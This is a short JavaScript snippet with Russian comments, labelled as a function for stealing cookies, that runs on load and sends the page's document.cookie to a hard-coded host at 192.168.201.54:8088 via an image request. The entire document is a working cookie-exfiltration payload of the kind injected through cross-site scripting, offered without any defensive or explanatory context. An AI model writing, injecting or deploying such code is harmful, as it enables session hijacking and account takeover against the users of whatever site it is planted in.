// Функция для кражи куки
function stealCookies() {
  var img = new Image();
  img.src = 'http://192.168.201.54:8088/stolen?cookie=' + encodeURIComponent(document.cookie);
  document.body.appendChild(img);
}

// Выполняем функцию при загрузке скрипта
stealCookies();
